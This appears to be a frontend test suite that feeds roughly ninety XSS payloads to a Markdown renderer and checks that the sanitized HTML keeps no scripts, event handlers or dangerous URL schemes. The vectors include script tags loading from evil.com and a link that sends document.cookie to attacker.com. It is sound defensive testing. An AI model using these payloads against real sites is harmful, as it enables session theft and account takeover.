// frontend/test-adversarial-xss.mjs
// Adversarial XSS & Markdown Sanitization Stress Test Suite for LabNotes Milestone 4

import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';

// Initialize DOM environment for DOMPurify and DOM verification
const dom = new JSDOM('<!doctype html><html><body><div id="mount"></div></body></html>', {
  runScripts: 'dangerously',
});
globalThis.window = dom.window;
globalThis.document = dom.window.document;
globalThis.Element = dom.window.Element;
globalThis.Node = dom.window.Node;

import { renderMarkdown, slugify } from './src/lib/markdown.ts';
import { assertNoXss } from '../e2e_tests/helpers/assertions.js';

console.log('================================================================');
console.log('  ADVERSARIAL XSS & MARKDOWN SANITIZATION STRESS TEST SUITE   ');
console.log('================================================================\n');

/**
 * Empirical DOM-level security verification:
 * Mounts rendered HTML into an active DOM tree, attaches an error/event trigger,
 * and asserts that zero scripts execute and zero dangerous attributes exist.
 */
function assertDomSecurity(htmlString) {
  const mount = dom.window.document.getElementById('mount');
  mount.innerHTML = htmlString;

  // 1. Assert no <script> elements in DOM
  const scripts = mount.querySelectorAll('script');
  assert.strictEqual(scripts.length, 0, `DOM contains ${scripts.length} unneutralized <script> tags`);

  // 2. Assert no <iframe>, <object>, <embed>, <base>, <meta> in DOM
  for (const tag of ['iframe', 'object', 'embed', 'base', 'meta', 'applet', 'style']) {
    const dangerousElements = mount.querySelectorAll(tag);
    assert.strictEqual(
      dangerousElements.length,
      0,
      `DOM contains ${dangerousElements.length} forbidden <${tag}> tags`
    );
  }

  // 3. Assert no inline event handlers on any DOM element
  const allElements = mount.querySelectorAll('*');
  for (const el of allElements) {
    for (const attr of el.attributes) {
      assert.ok(
        !/^on[a-z]+/i.test(attr.name),
        `Element <${el.tagName}> has active event handler attribute: ${attr.name}="${attr.value}"`
      );
      if (attr.name === 'href' || attr.name === 'src' || attr.name === 'action' || attr.name === 'formaction') {
        assert.ok(
          !/^\s*(javascript|vbscript|data:text\/html)/i.test(attr.value),
          `Element <${el.tagName}> has dangerous scheme attribute: ${attr.name}="${attr.value}"`
        );
      }
    }
  }

  // Clean mount container
  mount.innerHTML = '';
}

// Adversarial test battery covering all categories requested in dispatch
const testCategories = [
  {
    name: '1. Standard & Case-Variant Script Tags',
    vectors: [
      '<script>alert("XSS1")</script>',
      '<script src="https://evil.example.com/exploit.js"></script>',
      '<script type="text/javascript">alert(document.cookie)</script>',
      '<SCRIPT>alert("UPPERCASE")</SCRIPT>',
      '<sCrIpT>alert("MixedCase")</sCrIpT>',
      '<ScRiPt SRC="https://evil.com/x.js"></sCrIpT>',
      '<SCRIPT/XSS SRC="https://evil.com/xss.js"></SCRIPT>',
      '<script\x20type="text/javascript">javascript:alert(1);</script>',
      '<script\x09type="text/javascript">alert(1);</script>',
      '<script\x0Atype="text/javascript">alert(1);</script>',
      '<script\x0Dtype="text/javascript">alert(1);</script>',
      '<script\x0Ctype="text/javascript">alert(1);</script>',
    ],
  },
  {
    name: '2. Inline Event Handlers on HTML / SVG Elements',
    vectors: [
      '<img src="x" onerror="alert(1)">',
      '<img src=x onerror=alert(1)>',
      '<svg onload="alert(1)">',
      '<svg/onload=alert(1)>',
      '<body onload="alert(1)">',
      '<div onmouseover="alert(1)">Hover me</div>',
      '<button onclick="alert(1)">Click me</button>',
      '<input type="text" autofocus onfocus="alert(1)">',
      '<select onchange="alert(1)"><option>1</option></select>',
      '<textarea oninput="alert(1)">test</textarea>',
      '<details open ontoggle="alert(1)">Details</details>',
      '<audio src="invalid.mp3" onerror="alert(1)"></audio>',
      '<video poster="invalid.jpg" onerror="alert(1)"><source onerror="alert(1)"></video>',
      '<marquee onstart="alert(1)">Marquee text</marquee>',
    ],
  },
  {
    name: '3. Protocol Handlers in Markdown Links & Autolinks',
    vectors: [
      '[Safe Link](javascript:alert("XSS"))',
      '[Case link](JavaScript:alert("XSS"))',
      '[VBScript link](vbscript:msgbox(1))',
      '[Data HTML link](data:text/html,<script>alert(1)</script>)',
      '[Data HTML Base64](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
      '[Data SVG Base64](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+) />',
      '[Newline JS](javascript:\nalert(1))',
      '[Tab JS](javascript:\talert(1))',
      '[Entity Colon JS](javascript&#58;alert(1))',
      '[Hex Entity Colon JS](javascript&#x3a;alert(1))',
      '[Entity Encoded JS](jav&#x09;ascript:alert(1))',
      '[Encoded tab in protocol](jav&#9;ascript:alert(1))',
      '[Spaces before protocol](  javascript:alert(1))',
      '[Control char in protocol](jav\0ascript:alert(1))',
      '[Protocol relative link](//evil.com/xss)',
      '<javascript:alert(1)>',
    ],
  },
  {
    name: '4. Markdown Image Embed Vectors',
    vectors: [
      '![XSS image](javascript:alert(1))',
      '![XSS image](vbscript:alert(1))',
      '![XSS image](data:text/html,<script>alert(1)</script>)',
      '![XSS SVG](data:image/svg+xml,<svg onload=alert(1)>)',
      '![Normal Image](https://example.com/pic.png "Normal Title")',
      '![Alt with quotes](https://example.com/pic.png "Title with \'quotes\'")',
      '![Broken Image](https://invalid-host-for-testing-onerror.example/pic.png)',
    ],
  },
  {
    name: '5. Malformed, Nested & Broken HTML Tags',
    vectors: [
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<<script>script>alert(1)<</script>/script>',
      '<script<script>alert(1)</script>',
      '<script src="data:text/javascript,alert(1)">',
      '<a href="javascript:alert(1)">Dangerous link</a>',
      '<a href="jav&#x09;ascript:alert(1)">Entity link</a>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      '<embed src="javascript:alert(1)"></embed>',
      '<base href="javascript:alert(1)//">',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<img """><script>alert(1)</script>">',
    ],
  },
  {
    name: '6. SVG & MathML XML Namespace Vectors',
    vectors: [
      '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"></svg>',
      '<svg><set onbegin="alert(1)" attributeName="x" dur="1s"></svg>',
      '<svg><discard onbegin="alert(1)"></discard></svg>',
      '<svg><a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>',
      '<svg><script>alert(1)</script></svg>',
      '<math><mi xlink:href="javascript:alert(1)">click</mi></math>',
      '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
      '<math href="javascript:alert(1)">X</math>',
    ],
  },
  {
    name: '7. Markdown Custom Extension Injection (Headings, Code Fences, Tables)',
    vectors: [
      '## <script>alert(1)</script>',
      '## " onclick="alert(1)',
      '### Heading with \' onerror=\'alert(1)',
      '### `code` <img src=x onerror=alert(1)>',
      '```<script>alert(1)</script>\nconsole.log(1);\n```',
      '```html" onclick="alert(1)\nconsole.log(1);\n```',
      '```"><svg onload=alert(1)>\ncode\n```',
      '| Header 1 | <script>alert(1)</script> |\n|---|---|\n| Cell 1 | <img src=x onerror=alert(1)> |',
      '| Name | [XSS](javascript:alert(1)) |\n|---|---|\n| Val | Safe |',
    ],
  },
  {
    name: '8. DOM Clobbering & Sanitizer State Corruption',
    vectors: [
      '<form id="test"><input id="sanitize"></form>',
      '<a id="location" href="javascript:alert(1)">clobber</a>',
      '<img name="body" src="x">',
      '<form><input name="attributes"></form>',
      '<form id="window"><input name="document"></form>',
    ],
  },
  {
    name: '9. Obfuscated Entities, Whitespace & Comment Smuggling',
    vectors: [
      '<!--<script>alert(1)</script>-->',
      '<!-- --> <script>alert(1)</script>',
      '<![CDATA[<script>alert(1)</script>]]>',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">entity link</a>',
      '<a href=" \t\r\n javascript:alert(1)">whitespace protocol</a>',
    ],
  },
  {
    name: '10. Combined Mixed-Mode Exploitation',
    vectors: [
      `# Injected Heading
<script>alert("heading xss")</script>

[Click here for free grades](javascript:fetch("https://attacker.com/steal?cookie="+document.cookie))

\`\`\`javascript" onmouseover="alert('fence')
const x = 1;
\`\`\`

<img src="https://example.com/pic.jpg" onload="alert('img onload')">

| Vuln Table | Column 2 |
|---|---|
| <div onclick="alert('cell')">Click</div> | [xss](vbscript:run) |

<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
`,
    ],
  },
];

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failureDetails = [];

for (const cat of testCategories) {
  console.log(`\nTesting Category: ${cat.name} (${cat.vectors.length} vectors)`);
  console.log('-'.repeat(60));

  for (let i = 0; i < cat.vectors.length; i++) {
    const rawVector = cat.vectors[i];
    totalTests++;

    try {
      const renderResult = renderMarkdown(rawVector);
      const renderedHtml = renderResult.html;

      // 1. Strict assertNoXss validation against E2E helper
      assertNoXss(renderedHtml);

      // 2. Active DOM-level security assertion (JSDOM parsing + attribute audit)
      assertDomSecurity(renderedHtml);

      // 3. Heading / Slug integrity verification
      for (const tocItem of renderResult.toc) {
        // Slug ID must be strictly safe: only lowercase unicode letters, numbers, and hyphens
        assert.ok(
          /^[\p{L}\p{N}\-]+$/u.test(tocItem.id),
          `TOC item slug "${tocItem.id}" contains unsafe characters`
        );
        assert.ok(
          !/[<>"'&]/i.test(tocItem.id),
          `TOC item slug "${tocItem.id}" must never contain HTML markup characters`
        );
      }

      passedTests++;
      const sample = rawVector.replace(/\n/g, ' ').slice(0, 48);
      console.log(`  ✓ [PASS] #${totalTests} "${sample}..."`);
    } catch (err) {
      failedTests++;
      const failInfo = {
        category: cat.name,
        vector: rawVector,
        error: err.message,
      };
      failureDetails.push(failInfo);
      console.error(`  ✗ [FAIL] #${totalTests} vector: ${rawVector.slice(0, 50)}...`);
      console.error(`    Error: ${err.message}`);
    }
  }
}

console.log('\n================================================================');
console.log('                      TEST RESULTS SUMMARY                     ');
console.log('================================================================');
console.log(`Total Adversarial Vectors Executed: ${totalTests}`);
console.log(`Passed:                             ${passedTests}`);
console.log(`Failed:                             ${failedTests}`);
console.log('================================================================\n');

if (failedTests > 0) {
  console.error(`FAILURE: ${failedTests} tests failed! Details:`);
  console.error(JSON.stringify(failureDetails, null, 2));
  process.exit(1);
} else {
  console.log('ALL ADVERSARIAL XSS TESTS PASSED WITH 0 FAILURES (100% SUCCESS RATE)!');
  console.log('Pipeline in frontend/src/lib/markdown.ts is proven secure against all tested vectors.');
}
